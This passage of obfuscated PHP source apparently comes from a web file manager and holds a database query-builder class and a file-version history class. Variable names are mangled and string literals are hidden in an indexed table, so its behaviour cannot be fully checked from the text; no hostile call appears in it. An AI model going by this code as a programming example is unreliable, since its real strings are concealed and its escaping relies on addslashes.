$_SERVER[ê‘³Æ±]; return !empty($Éé†°Ù ) ? $«¹Ú ¨ö[1023] . $Éé†°Ù  : $«¹Ú ¨ö[12]; } protected function parseComment($µß•ó‘) { $Î¡–¢Éé =& $_SERVER[ê‘³Æ±]; return !empty($µß•ó‘) ? $Î¡–¢Éé[1024] . $µß•ó‘ . $Î¡–¢Éé[1025] : $Î¡–¢Éé[12]; } protected function parseDistinct($¥Ÿù‘“¢) { $ƒÁıô™™ =& $_SERVER[ê‘³Æ±]; return !empty($¥Ÿù‘“¢) ? $ƒÁıô™™[1026] : $ƒÁıô™™[12]; } protected function parseUnion($ÎÚ”ü›ì) { $©ç˜¢ó =& $_SERVER[ê‘³Æ±]; if (empty($ÎÚ”ü›ì)) { return $©ç˜¢ó[12]; } if (isset($ÎÚ”ü›ì[$©ç˜¢ó[345]])) { $ğ…¢ú¶ = $©ç˜¢ó[1027]; unset($ÎÚ”ü›ì[$©ç˜¢ó[345]]); } else { $ğ…¢ú¶ = $©ç˜¢ó[1028]; } foreach ($ÎÚ”ü›ì as $Üù¹Ò¶) { $âÎ›ªÛ€[] = $ğ…¢ú¶ . (is_array($Üù¹Ò¶) ? $this->buildSelectSql($Üù¹Ò¶) : $Üù¹Ò¶); } return implode($©ç˜¢ó[53], $âÎ›ªÛ€); } public function insert($–İ—Í·, $¸Èñ³ä¨ = array(), $¤ø¤ÉŞå = false) { $˜®•›í  =& $_SERVER[ê‘³Æ±]; $°µëõÏØ = $Íİ›“¬ = array(); $this->model = $¸Èñ³ä¨[$˜®•›í [278]]; foreach ($–İ—Í· as $¨×ÚÄ¬ => $ôÌ‘Ğë”) { if (is_array($ôÌ‘Ğë”) && $˜®•›í [294] == $ôÌ‘Ğë”[0]) { $Íİ›“¬[] = $this->parseKey($¨×ÚÄ¬); $°µëõÏØ[] = $ôÌ‘Ğë”[1]; } elseif (is_scalar($ôÌ‘Ğë”) || is_null($ôÌ‘Ğë”)) { $Íİ›“¬[] = $this->parseKey($¨×ÚÄ¬); $°µëõÏØ[] = $this->parseValue($ôÌ‘Ğë”); } } $¿ºíÊ¶ = ($¤ø¤ÉŞå ? $˜®•›í [896] : $˜®•›í [897]) . $˜®•›í [898] . $this->parseTable($¸Èñ³ä¨[$˜®•›í [276]]) . $˜®•›í [892] . implode($˜®•›í [50], $Íİ›“¬) . $˜®•›í [893] . implode($˜®•›í [50], $°µëõÏØ) . $˜®•›í [894]; $¿ºíÊ¶ .= $this->parseLock(isset($¸Èñ³ä¨[$˜®•›í [837]]) ? $¸Èñ³ä¨[$˜®•›í [837]] : !1); $¿ºíÊ¶ .= $this->parseComment(!empty($¸Èñ³ä¨[$˜®•›í [351]]) ? $¸Èñ³ä¨[$˜®•›í [351]] : $˜®•›í [12]); return $this->execute($¿ºíÊ¶, $this->parseBind(!empty($¸Èñ³ä¨[$˜®•›í [282]]) ? $¸Èñ³ä¨[$˜®•›í [282]] : array())); } public function selectInsert($ßóÚ¯ê, $ùìæ²ğ«, $êØ“—ÙÏ = array()) { $êøç¯Æ€ =& $_SERVER[ê‘³Æ±]; $this->model = $êØ“—ÙÏ[$êøç¯Æ€[278]]; if (is_string($ßóÚ¯ê)) { $ßóÚ¯ê = explode($êøç¯Æ€[50], $ßóÚ¯ê); } array_walk($ßóÚ¯ê, array($this, $êøç¯Æ€[895])); $¹‰›ºßÙ = $êøç¯Æ€[1029] . $this->parseTable($ùìæ²ğ«) . $êøç¯Æ€[892] . implode($êøç¯Æ€[50], $ßóÚ¯ê) . $êøç¯Æ€[1007]; $¹‰›ºßÙ .= $this->buildSelectSql($êØ“—ÙÏ); return $this->execute($¹‰›ºßÙ, $this->parseBind(!empty($êØ“—ÙÏ[$êøç¯Æ€[282]]) ? $êØ“—ÙÏ[$êøç¯Æ€[282]] : array())); } public function update($¾ÜÙ®ó¿, $ü´½êÔ¨) { $œ‡æ‘ŞË =& $_SERVER[ê‘³Æ±]; $this->model = $ü´½êÔ¨[$œ‡æ‘ŞË[278]]; $òÁ»šë€ = $œ‡æ‘ŞË[1030] . $this->parseTable($ü´½êÔ¨[$œ‡æ‘ŞË[276]]) . $this->parseSet($¾ÜÙ®ó¿) . $this->parseWhere(!empty($ü´½êÔ¨[$œ‡æ‘ŞË[272]]) ? $ü´½êÔ¨[$œ‡æ‘ŞË[272]] : $œ‡æ‘ŞË[12]) . $this->parseOrder(!empty($ü´½êÔ¨[$œ‡æ‘ŞË[362]]) ? $ü´½êÔ¨[$œ‡æ‘ŞË[362]] : $œ‡æ‘ŞË[12]) . $this->parseLimit(!empty($ü´½êÔ¨[$œ‡æ‘ŞË[289]]) ? $ü´½êÔ¨[$œ‡æ‘ŞË[289]] : $œ‡æ‘ŞË[12]) . $this->parseLock(isset($ü´½êÔ¨[$œ‡æ‘ŞË[837]]) ? $ü´½êÔ¨[$œ‡æ‘ŞË[837]] : !1) . $this->parseComment(!empty($ü´½êÔ¨[$œ‡æ‘ŞË[351]]) ? $ü´½êÔ¨[$œ‡æ‘ŞË[351]] : $œ‡æ‘ŞË[12]); return $this->execute($òÁ»šë€, $this->parseBind(!empty($ü´½êÔ¨[$œ‡æ‘ŞË[282]]) ? $ü´½êÔ¨[$œ‡æ‘ŞË[282]] : array())); } public function delete($¤‚»áôâ = array()) { $¤ É–ˆ‡ =& $_SERVER[ê‘³Æ±]; $this->model = $¤‚»áôâ[$¤ É–ˆ‡[278]]; $‚ˆÊ¿ä‡ = $¤ É–ˆ‡[1031] . $this->parseTable($¤‚»áôâ[$¤ É–ˆ‡[276]]) . $this->parseWhere(!empty($¤‚»áôâ[$¤ É–ˆ‡[272]]) ? $¤‚»áôâ[$¤ É–ˆ‡[272]] : $¤ É–ˆ‡[12]) . $this->parseOrder(!empty($¤‚»áôâ[$¤ É–ˆ‡[362]]) ? $¤‚»áôâ[$¤ É–ˆ‡[362]] : $¤ É–ˆ‡[12]) . $this->parseLimit(!empty($¤‚»áôâ[$¤ É–ˆ‡[289]]) ? $¤‚»áôâ[$¤ É–ˆ‡[289]] : $¤ É–ˆ‡[12]) . $this->parseLock(isset($¤‚»áôâ[$¤ É–ˆ‡[837]]) ? $¤‚»áôâ[$¤ É–ˆ‡[837]] : !1) . $this->parseComment(!empty($¤‚»áôâ[$¤ É–ˆ‡[351]]) ? $¤‚»áôâ[$¤ É–ˆ‡[351]] : $¤ É–ˆ‡[12]); return $this->execute($‚ˆÊ¿ä‡, $this->parseBind(!empty($¤‚»áôâ[$¤ É–ˆ‡[282]]) ? $¤‚»áôâ[$¤ É–ˆ‡[282]] : array())); } public function select($Ä˜Ùˆö© = array()) { $°§àÏê¾ =& $_SERVER[ê‘³Æ±]; $this->model = $Ä˜Ùˆö©[$°§àÏê¾[278]]; $Å©§ÄŸ“ = $this->buildSelectSql($Ä˜Ùˆö©); $­É¶¥Ë = isset($Ä˜Ùˆö©[$°§àÏê¾[346]]) ? $Ä˜Ùˆö©[$°§àÏê¾[346]] : !1; if ($­É¶¥Ë) { $ú‹ÈÀğ = is_string($­É¶¥Ë[$°§àÏê¾[95]]) ? $­É¶¥Ë[$°§àÏê¾[95]] : $°§àÏê¾[1032] . md5($Å©§ÄŸ“); $õ˜ï×ì… = think_cache($ú‹ÈÀğ, $°§àÏê¾[12], $­É¶¥Ë); if (!1 !== $õ˜ï×ì…) { return $õ˜ï×ì…; } } $ï¿äÆŒÁ = $this->query($Å©§ÄŸ“, $this->parseBind(!empty($Ä˜Ùˆö©[$°§àÏê¾[282]]) ? $Ä˜Ùˆö©[$°§àÏê¾[282]] : array())); if ($­É¶¥Ë && !1 !== $ï¿äÆŒÁ) { think_cache($ú‹ÈÀğ, $ï¿äÆŒÁ, $­É¶¥Ë); } return $ï¿äÆŒÁ; } public function buildSelectSql($¢Œ÷±Ü¦ = array()) { $ô¡î´ÇÊ =& $_SERVER[ê‘³Æ±]; if (isset($¢Œ÷±Ü¦[$ô¡î´ÇÊ[350]])) { if (strpos($¢Œ÷±Ü¦[$ô¡î´ÇÊ[350]], $ô¡î´ÇÊ[50])) { list($ô¹…çÕÁ, $ıôİŠ¿) = explode($ô¡î´ÇÊ[50], $¢Œ÷±Ü¦[$ô¡î´ÇÊ[350]]); } else { $ô¹…çÕÁ = $¢Œ÷±Ü¦[$ô¡î´ÇÊ[350]]; } $ô¹…çÕÁ = $ô¹…çÕÁ ? $ô¹…çÕÁ : 1; $ıôİŠ¿ = isset($ıôİŠ¿) ? $ıôİŠ¿ : (is_numeric($¢Œ÷±Ü¦[$ô¡î´ÇÊ[289]]) ? $¢Œ÷±Ü¦[$ô¡î´ÇÊ[289]] : 20); $çÉ·ñ¨ö = $ıôİŠ¿ * ((int) $ô¹…çÕÁ - 1); $¢Œ÷±Ü¦[$ô¡î´ÇÊ[289]] = $çÉ·ñ¨ö . $ô¡î´ÇÊ[50] . $ıôİŠ¿; } if (think_config($ô¡î´ÇÊ[1033])) { $û™ı«ßé = $ô¡î´ÇÊ[1034] . md5(serialize($¢Œ÷±Ü¦)); $ÏÈÛßò¹ = think_cache($û™ı«ßé); if ($ÏÈÛßò¹) { return $ÏÈÛßò¹; } } $’ÂªÍàó = $this->parseSql($this->selectSql, $¢Œ÷±Ü¦); $’ÂªÍàó .= $this->parseLock(isset($¢Œ÷±Ü¦[$ô¡î´ÇÊ[837]]) ? $¢Œ÷±Ü¦[$ô¡î´ÇÊ[837]] : !1); if (isset($û™ı«ßé)) { think_cache($û™ı«ßé, $’ÂªÍàó); } return $’ÂªÍàó; } public function parseSql($î’ùŠÍ, $•‚ºÛó½ = array()) { $ëòÓ½¡ˆ =& $_SERVER[ê‘³Æ±]; $î’ùŠÍ = str_replace(array($ëòÓ½¡ˆ[1035], $ëòÓ½¡ˆ[1036], $ëòÓ½¡ˆ[1037], $ëòÓ½¡ˆ[1038], $ëòÓ½¡ˆ[1039], $ëòÓ½¡ˆ[1040], $ëòÓ½¡ˆ[1041], $ëòÓ½¡ˆ[1042], $ëòÓ½¡ˆ[1043], $ëòÓ½¡ˆ[1044], $ëòÓ½¡ˆ[1045]), array($this->parseTable("{$•‚ºÛó½[$ëòÓ½¡ˆ[276]]}"), $this->parseDistinct(isset($•‚ºÛó½[$ëòÓ½¡ˆ[1046]]) ? $•‚ºÛó½[$ëòÓ½¡ˆ[1046]] : !1), $this->parseField(!empty($•‚ºÛó½[$ëòÓ½¡ˆ[270]]) ? $•‚ºÛó½[$ëòÓ½¡ˆ[270]] : $ëòÓ½¡ˆ[183]), $this->parseJoin(!empty($•‚ºÛó½[$ëòÓ½¡ˆ[279]]) ? $•‚ºÛó½[$ëòÓ½¡ˆ[279]] : $ëòÓ½¡ˆ[12]), $this->parseWhere(!empty($•‚ºÛó½[$ëòÓ½¡ˆ[272]]) ? $•‚ºÛó½[$ëòÓ½¡ˆ[272]] : $ëòÓ½¡ˆ[12]), $this->parseGroup(!empty($•‚ºÛó½[$ëòÓ½¡ˆ[508]]) ? $•‚ºÛó½[$ëòÓ½¡ˆ[508]] : $ëòÓ½¡ˆ[12]), $this->parseHaving(!empty($•‚ºÛó½[$ëòÓ½¡ˆ[1047]]) ? $•‚ºÛó½[$ëòÓ½¡ˆ[1047]] : $ëòÓ½¡ˆ[12]), $this->parseOrder(!empty($•‚ºÛó½[$ëòÓ½¡ˆ[362]]) ? $•‚ºÛó½[$ëòÓ½¡ˆ[362]] : $ëòÓ½¡ˆ[12]), $this->parseLimit(!empty($•‚ºÛó½[$ëòÓ½¡ˆ[289]]) ? $•‚ºÛó½[$ëòÓ½¡ˆ[289]] : $ëòÓ½¡ˆ[12]), $this->parseUnion(!empty($•‚ºÛó½[$ëòÓ½¡ˆ[344]]) ? $•‚ºÛó½[$ëòÓ½¡ˆ[344]] : $ëòÓ½¡ˆ[12]), $this->parseComment(!empty($•‚ºÛó½[$ëòÓ½¡ˆ[351]]) ? $•‚ºÛó½[$ëòÓ½¡ˆ[351]] : $ëòÓ½¡ˆ[12])), $î’ùŠÍ); return $î’ùŠÍ; } public function getLastSql($û„’Õˆ = '') { return $û„’Õˆ ? $this->modelSql[$û„’Õˆ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($é»µà­) { return addslashes($é»µà­); } public function setModel($¯ßªúİÂ) { $this->model = $¯ßªúİÂ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto Cª¡æÅ­˜Ş; BÆÇÄ¢å¸: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ğ„Ï®Ú =& $_SERVER[ê‘³Æ±]; $üÕ–„ı• = $GLOBALS[$ğ„Ï®Ú[6]][$ğ„Ï®Ú[90]]; if ($üÕ–„ı•[$ğ„Ï®Ú[1195]] != 1) { return; } if ($üÕ–„ı•[$ğ„Ï®Ú[1196]] <= 0) { return; } if (isset($_REQUEST[$ğ„Ï®Ú[1197]]) && $_REQUEST[$ğ„Ï®Ú[1197]] == $ğ„Ï®Ú[89]) { return; } Hook::bind($ğ„Ï®Ú[1198], $ğ„Ï®Ú[1199]); Hook::bind($ğ„Ï®Ú[1200], $ğ„Ï®Ú[1201]); Hook::bind($ğ„Ï®Ú[1202], $ğ„Ï®Ú[1203]); Hook::bind($ğ„Ï®Ú[1204], $ğ„Ï®Ú[1205]); Hook::bind($ğ„Ï®Ú[1206], $ğ„Ï®Ú[1207]); Hook::bind($ğ„Ï®Ú[1208], $ğ„Ï®Ú[1209]); } public static function eventBeforeUpload($¡õ¸Ÿ¹ˆ) { if ($¡õ¸Ÿ¹ˆ[3] && $¡õ¸Ÿ¹ˆ[3] != REPEAT_REPLACE) { return; } $‡Š‚èÈ = self::parsePath($¡õ¸Ÿ¹ˆ[0]); if (!$‡Š‚èÈ) { return; } self::add($‡Š‚èÈ); } public static function eventBeforeEdit($öû“¶²¨) { $ĞõÒç´Å = self::parsePath($öû“¶²¨[0]); if (!$ĞõÒç´Å) { return; } self::add($ĞõÒç´Å); } public static function eventBeforeCopyFile($íÎŒßà, $Á†ÈÃ‹·, $ºÇ½çŸú, $…‡Õ´ı, $‰Ëü¹®‡, $²ùìÃóÖ) { $Ã·èü¦µ = $ºÇ½çŸú->getPathOuter($…‡Õ´ı); $‡„³™‹ = self::parsePath($Ã·èü¦µ); if (!$‡„³™‹) { return; } self::add($‡„³™‹); } public static function eventBeforeRename($ÕÒÏàÃ) { $áÎ”³Ã =& $_SERVER[ê‘³Æ±]; $Ğß™óË» = self::parsePath($ÕÒÏàÃ[0]); if (!$Ğß™óË») { return; } $ĞşêÎÒ¥ = self::checkInHistory($Ğß™óË»); if (!$ĞşêÎÒ¥) { return; } if ($ĞşêÎÒ¥[$áÎ”³Ã[33]] == $áÎ”³Ã[194]) { $¾Ğå“®Ì = self::listData($Ğß™óË»); if ($¾Ğå“®Ì && $¾Ğå“®Ì[$áÎ”³Ã[366]]) { self::moveHistory($Ğß™óË», $ÕÒÏàÃ[1]); } } else { IO::rename($ĞşêÎÒ¥[$áÎ”³Ã[78]], $ÕÒÏàÃ[1]); } } public static function eventBeforeMove($ñ€ŸäöÒ) { $¥ìªÓÌµ =& $_SERVER[ê‘³Æ±]; $¶áäå•¿ = self::parsePath($ñ€ŸäöÒ[0]); if (!$¶áäå•¿) { return; } $“Éİ…³à = self::parsePath($ñ€ŸäöÒ[1]); if (!$“Éİ…³à) { return; } $ûìùŸ¤ô = $ñ€ŸäöÒ[3]; $ŞåÖ´¸ß = self::checkInHistory($¶áäå•¿); if (!$ŞåÖ´¸ß) { return; } $£åà™—­ = self::pathHistory($“Éİ…³à); if ($ŞåÖ´¸ß[$¥ìªÓÌµ[33]] == $¥ìªÓÌµ[194]) { $«ºú‚•¨ = self::listData($¶áäå•¿); $ßÉŠşì¯ = rtrim($“Éİ…³à, $¥ìªÓÌµ[8]) . $¥ìªÓÌµ[8] . ($ûìùŸ¤ô ? $ûìùŸ¤ô : get_path_this($¶áäå•¿)); $ò¡¡ğ¿õ = self::listData($ßÉŠşì¯); if ($«ºú‚•¨ && $«ºú‚•¨[$¥ìªÓÌµ[366]] && $ò¡¡ğ¿õ && $ò¡¡ğ¿õ[$¥ìªÓÌµ[366]]) { return self::clear($¶áäå•¿); } if ($«ºú‚•¨ && $«ºú‚•¨[$¥ìªÓÌµ[366]]) { self::moveHistory($¶áäå•¿, $ûìùŸ¤ô, $£åà™—­); } } else { IO::move($ŞåÖ´¸ß[$¥ìªÓÌµ[78]], $£åà™—­, !1, $ûìùŸ¤ô); self::clearEmptyFolder(IO::pathFather($ŞåÖ´¸ß[$¥ìªÓÌµ[78]])); } } public static function eventAfterRemove($‡’êĞ‚³, $¥Ç¾¦‘Ö) { $ŸîÌÒ¥¯ =& $_SERVER[ê‘³Æ±]; if (!$¥Ç¾¦‘Ö) { return; } $øáı—… = self::parsePath($‡’êĞ‚³[0]); if (!$øáı—…) { return; } $êü³ìØÙ = self::checkInHistory($øáı—…); if (!$êü³ìØÙ) { return; } if ($êü³ìØÙ[$ŸîÌÒ¥¯[33]] == $ŸîÌÒ¥¯[194]) { $‚ ¢Óñ­ = self::listData($øáı—…, !1); if ($‚ ¢Óñ­ && $‚ ¢Óñ­[$ŸîÌÒ¥¯[366]]) { self::clear($øáı—…, !1); } } else { IO::remove($êü³ìØÙ[$ŸîÌÒ¥¯[78]]); self::clearEmptyFolder(IO::pathFather($êü³ìØÙ[$ŸîÌÒ¥¯[78]])); } } private static function checkInHistory($¾×œ½¬) { $è¼˜ß÷ = self::pathHistory($¾×œ½¬); if (!IO::exist($è¼˜ß÷)) { $è¼˜ß÷ .= $_SERVER[ê‘³Æ±][1210]; } return IO::exist($è¼˜ß÷) ? IO::info($è¼˜ß÷) : !1; } private static function parsePath($÷«ˆÛã) { $â¸‰€Üİ =& $_SERVER[ê‘³Æ±]; if (!$÷«ˆÛã) { return !1; } if ($GLOBALS[$â¸‰€Üİ[1211]]) { return; } $³éŠ†Ò” = KodIO::parse($÷«ˆÛã); $›ÉÍîèÛ = $³éŠ†Ò”[$â¸‰€Üİ[33]]; $ïÎ¶°À = !$›ÉÍîèÛ || $›ÉÍîèÛ == KodIO::KOD_IO || $›ÉÍîèÛ == KodIO::KOD_SHARE_ITEM; if (!$ïÎ¶°À || !$³éŠ†Ò”[$â¸‰€Üİ[1212]]) { return !1; } if (substr($÷«ˆÛã, 0, strlen(DATA_PATH . $â¸‰€Üİ[1213])) == DATA_PATH . $â¸‰€Üİ[1213]) { return !1; } if ($›ÉÍîèÛ == KodIO::KOD_SHARE_ITEM) { $éÈõÛÅñ = IO::init($÷«ˆÛã); if ($éÈõÛÅñ->pathParse[$â¸‰€Üİ[1140]]) { return self::parsePath($éÈõÛÅñ->pathParse[$â¸‰€Üİ[1140]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $®‡šÈ» = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $â¸‰€Üİ[1214]); foreach ($®‡šÈ» as $³‡Ü†¸¨) { if (!$›ÉÍîèÛ && substr($÷«ˆÛã, 0, strlen($³‡Ü†¸¨)) == $³‡Ü†¸¨) { return !1; } } self::log($GLOBALS[$â¸‰€Üİ[1135]] . $â¸‰€Üİ[1215] . $÷«ˆÛã); return $÷«ˆÛã; } private static function pathHistory($À‹µ°ÅÊ) { $èõÍäõ  =& $_SERVER[ê‘³Æ±]; $¹íşû×¼ = self::$_historyBase . ltrim(KodIO::clear($À‹µ°ÅÊ), $èõÍäõ [8]); $¹íşû×¼ = str_replace(array($èõÍäõ [1216]), array($èõÍäõ [1217]), $¹íşû×¼); return $¹íşû×¼; } public static function log($Ùüº”ƒ’) { } public static function historyCount($“ƒè¢£½) { $êÏøÒÕÊ =& $_SERVER[ê‘³Æ±]; $—¨ËÄ° = array(); $ÆîÅ”Ô = array(); foreach ($“ƒè¢£½ as $‹›ïŞš) { $÷»ÍêÎ = get_path_father($‹›ïŞš); if (!$ÆîÅ”Ô[$÷»ÍêÎ]) { $ÆîÅ”Ô[$÷»ÍêÎ] = array(); } $ÆîÅ”Ô[$÷»ÍêÎ][] = get_path_this($‹›ïŞš); } foreach ($ÆîÅ”Ô as $÷»ÍêÎ => $—»©ß¬¦) { $ÛÏÁÑÅÙ = self::parsePath($÷»ÍêÎ); if (!$ÛÏÁÑÅÙ) { continue; } foreach ($—»©ß¬¦ as $¸ô»ş—Ë) { $ÑìÃâ³ç = self::listData(rtrim($ÛÏÁÑÅÙ, $êÏøÒÕÊ[8]) . $êÏøÒÕÊ[8] . $¸ô»ş—Ë, !1); if ($ÑìÃâ³ç && $ÑìÃâ³ç[$êÏøÒÕÊ[366]]) { $—¨ËÄ°[rtrim($÷»ÍêÎ, $êÏøÒÕÊ[8]) . $êÏøÒÕÊ[8] . $¸ô»ş—Ë] = count($ÑìÃâ³ç[$êÏøÒÕÊ[366]]); } } } return $—¨ËÄ°; } public static function add($§¸ò¼˜) { $ñÌ”è… =& $_SERVER[ê‘³Æ±]; $ãÑäÒÚ = self::listData($§¸ò¼˜); if (!$ãÑäÒÚ) { return; } $•‰Ò–’ˆ = Model($ñÌ”è…[756])->get($ñÌ”è…[1218]); $ş¼™¹¸÷ = $GLOBALS[$ñÌ”è…[6]][$ñÌ”è…[90]][$ñÌ”è…[1196]]; $ıá¸şŒÒ = $•‰Ò–’ˆ == $ñÌ”è…[1219] ? 5 : $ş¼™¹¸÷; if ($ş¼™¹¸÷ <= 0) { return; } $ï¦î£É÷ = IO::hashSimple($§¸ò¼˜); $»ÈŒ°¿ = IO::info($§¸ò¼˜); $’œÖø„Õ = $ãÑäÒÚ[$ñÌ”è…[366]]; if ($»ÈŒ°¿[$ñÌ”è…[80]] == 0) { return; } if ($»ÈŒ°¿[$ñÌ”è…[80]] >= 1024 * 1024 * 500) { return !1; } if ($’œÖø„Õ && $’œÖø„Õ[0][$ñÌ”è…[172]] == $ï¦î£É÷) { return !0; } if (array_key_exists($ñÌ”è…[197], $»ÈŒ°¿) && !$»ÈŒ°¿[$ñÌ”è…[197]]) { return !1; } $øÑÔÃº = short_id(time()); $ˆçŸİ¾¾ = array($ñÌ”è…[394] => $øÑÔÃº, $ñÌ”è…[172] => $ï¦î£É÷, $ñÌ”è…[32] => $»ÈŒ°¿[$ñÌ”è…[32]] . $ñÌ”è…[10] . date($ñÌ”è…[1220]) . rand_string(1), $ñÌ”è…[80] => $»ÈŒ°¿[$ñÌ”è…[80]], $ñÌ”è…[445] => USER_ID, $ñÌ”è…[195] => time(), $ñÌ”è…[1221] => $ñÌ”è…[12]); IO::mkdir($ãÑäÒÚ[$ñÌ”è…[1222]]); $öõ´¯‰³ = IO::copy($§¸ò¼˜, $ãÑäÒÚ[$ñÌ”è…[1222]], !1, $ˆçŸİ¾¾[$ñÌ”è…[32]]); if (!$öõ´¯‰³) { self::clearEmptyFolder($ãÑäÒÚ[$ñÌ”è…[1222]]); return !1; } array_unshift($’œÖø„Õ, $ˆçŸİ¾¾); if (count($’œÖø„Õ) > $ıá¸şŒÒ) { $Õò«©è = array_slice($’œÖø„Õ, $ıá¸şŒÒ); foreach ($Õò«©è as $ÕûÉ¢Á¿) { IO::remove($ãÑäÒÚ[$ñÌ”è…[1222]] . $ÕûÉ¢Á¿[$ñÌ”è…[32]]); } $’œÖø„Õ = array_slice($’œÖø„Õ, 0, $ıá¸şŒÒ); } return self::saveData($ãÑäÒÚ[$ñÌ”è…[1223]], $’œÖø„Õ); } public static function remove($àşÙ¹Ğ¬, $”ĞÁç£©) { $‘…’­‰¼ =& $_SERVER[ê‘³Æ±]; $î×ºª– = self::listData($àşÙ¹Ğ¬); $ÌÈª‰´ = array(); if (!$î×ºª–) { return !1; } foreach ($î×ºª–[$‘…’­‰¼[366]] as $Ğà¿) { if ($Ğà¿[$‘…’­‰¼[394]] == $”ĞÁç£©) { IO::remove($î×ºª–[$‘…’­‰¼[1222]] . $Ğà¿[$‘…’­‰¼[32]]); continue; } $ÌÈª‰´[] = $Ğà¿; } return self::saveData($î×ºª–[$‘…’­‰¼[1223]], $ÌÈª‰´); } public static function clear($Ø‘À¶æ, $¤øøş‘² = true) { $Ù³õ²¼ =& $_SERVER[ê‘³Æ±]; $“İĞ½‡  = self::listData($Ø‘À¶æ, $¤øøş‘²); if (!$“İĞ½‡ ) { return !1; } foreach ($“İĞ½‡ [$Ù³õ²¼[366]] as $ÌÚ—€­) { IO::remove($“İĞ½‡ [$Ù³õ²¼[1222]] . $ÌÚ—€­[$Ù³õ²¼[32]]); } return self::saveData($“İĞ½‡ [$Ù³õ²¼[1223]], array()); } public static function moveHistory($¨¶‘ü¼, $¾óúò‘ = '', $½ê’Ó“˜ = '') { $çî’ÄÓ =& $_SERVER[ê‘³Æ±]; $ÎĞÅ©Ã¤ = self::listData($¨¶‘ü¼, !1); if (!$ÎĞÅ©Ã¤ || !$ÎĞÅ©Ã¤[$çî’ÄÓ[366]]) { return !1; } $Ú“Ëñ¡ú = $çî’ÄÓ[1210]; $¾óúò‘ = $¾óúò‘ ? $¾óúò‘ : get_path_this($¨¶‘ü¼); $½ê’Ó“˜ = $½ê’Ó“˜ ? $½ê’Ó“˜ : $ÎĞÅ©Ã¤[$çî’ÄÓ[1222]]; $øèî¿Ç = substr(get_path_this($ÎĞÅ©Ã¤[$çî’ÄÓ[1223]]), 0, -strlen($Ú“Ëñ¡ú)); foreach ($ÎĞÅ©Ã¤[$çî’ÄÓ[366]] as $šçºŠÛÏ => $‚ç·ÛÁô) { $óÓˆ õ = $¾óúò‘ . substr($‚ç·ÛÁô[$çî’ÄÓ[32]], strlen($øèî¿Ç)); $¶—íƒÊú = IO::move($ÎĞÅ©Ã¤[$çî’ÄÓ[1222]] . $‚ç·ÛÁô[$çî’ÄÓ[32]], $½ê’Ó“˜, !1, $óÓˆ õ); if ($¶—íƒÊú) { $ÎĞÅ©Ã¤[$çî’ÄÓ[366]][$šçºŠÛÏ][$çî’ÄÓ[32]] = $óÓˆ õ; } } $ÎĞÅ©Ã¤[$çî’ÄÓ[1223]] = IO::move($ÎĞÅ©Ã¤[$çî’ÄÓ[1223]], $½ê’Ó“˜, !1, $¾óúò‘ . $Ú“Ëñ¡ú); self::saveData($ÎĞÅ©Ã¤[$çî’ÄÓ[1223]], $ÎĞÅ©Ã¤[$çî’ÄÓ[366]]); self::clearEmptyFolder($ÎĞÅ©Ã¤[$çî’ÄÓ[1222]]); } public static function rollback($ÃÍÎ“İ¶, $£¸àòœÒ) { $áÖÃ®¦Ÿ =& $_SERVER[ê‘³Æ±]; $ÄÔÆ²ò = self::listData($ÃÍÎ“İ¶); if (!$ÄÔÆ²ò) { return; } $£Ù€Âáî = IO::info($ÃÍÎ“İ¶); foreach ($ÄÔÆ²ò[$áÖÃ®¦Ÿ[366]] as $µ”‘Ğİ¯ => $šÕµë) { if ($šÕµë[$áÖÃ®¦Ÿ[394]] == $£¸àòœÒ) { self::add($ÃÍÎ“İ¶); $©Øä³£€ = $ÄÔÆ²ò[$áÖÃ®¦Ÿ[1222]] . $šÕµë[$áÖÃ®¦Ÿ[32]]; $´‰¬é÷ = IO::copy($©Øä³£€, IO::pathFather($ÃÍÎ“İ¶), REPEAT_REPLACE, $£Ù€Âáî[$áÖÃ®¦Ÿ[32]]); if ($´‰¬é÷) { self::remove($ÃÍÎ“İ¶, $£¸àòœÒ); } return $´‰¬é÷; } } return !1; } public static function setDetail($Ê¹ ÖÛã, $ªéû–ÕÒ, $İÙĞ×Ş) { $§ı¹´“Š =& $_SERVER[ê‘³Æ±]; $ß·¼ôƒœ = self::listData($Ê¹ ÖÛã); if (!$ß·¼ôƒœ) { return; } foreach ($ß·¼ôƒœ[$§ı¹´“Š[366]] as $î—°êø => $óÎÛ¥Âº) { if ($óÎÛ¥Âº[$§ı¹´“Š[394]] == $ªéû–ÕÒ) { $ß·¼ôƒœ[$§ı¹´“Š[366]][$î—°êø][$§ı¹´“Š[1221]] = $İÙĞ×Ş; self::saveData($ß·¼ôƒœ[$§ı¹´“Š[1223]], $ß·¼ôƒœ[$§ı¹´“Š[366]]); return !0; } } return !1; } public static function fileInfo($«ŞÍİ»—, $­²Ü³äç) { $â¿³éÑ× =& $_SERVER[ê‘³Æ±]; $Ğ¿øÚœõ = self::listData($«ŞÍİ»—); if (!$Ğ¿øÚœõ) { show_json(LNG($â¿³éÑ×[106]), !1); } $ôÉ»£Øš = $â¿³éÑ×[12]; foreach ($Ğ¿øÚœõ[$â¿³éÑ×[366]] as $„Ï¾“¥— => $™¨üÈâÄ) { if ($™¨üÈâÄ[$â¿³éÑ×[394]] != $­²Ü³äç) { continue; } $ôÉ»£Øš = $Ğ¿øÚœõ[$â¿³éÑ×[1222]] . $™¨üÈâÄ[$â¿³éÑ×[32]]; break; } if (!$ôÉ»£Øš) { show_json(LNG($â¿³éÑ×[106]), !1); } return IO::info($ôÉ»£Øš); } public static function fileOut($ş³İ‚áŞ, $×Ü“ÍØÈ, $–İÔõÒ = false) { $‡›Áª±¯ =& $_SERVER[ê‘³Æ±]; $¯ó½ÊÃ¨ = self::fileInfo($ş³İ‚áŞ, $×Ü“ÍØÈ); $´ŞûÒÌœ =& $GLOBALS[$‡›Áª±¯[7]]; $–İÔõÒ = isset($´ŞûÒÌœ[$‡›Áª±¯[1186]]) && $´ŞûÒÌœ[$‡›Áª±¯[1186]] == 1; if (isset($´ŞûÒÌœ[$‡›Áª±¯[33]]) && $´ŞûÒÌœ[$‡›Áª±¯[33]] == $‡›Áª±¯[1224]) { return IO::fileOutImage($¯ó½ÊÃ¨[$‡›Áª±¯[78]], $´ŞûÒÌœ[$‡›Áª±¯[1225]]); } IO::fileOut($¯ó½ÊÃ¨[$‡›Áª±¯[78]], $–İÔõÒ, 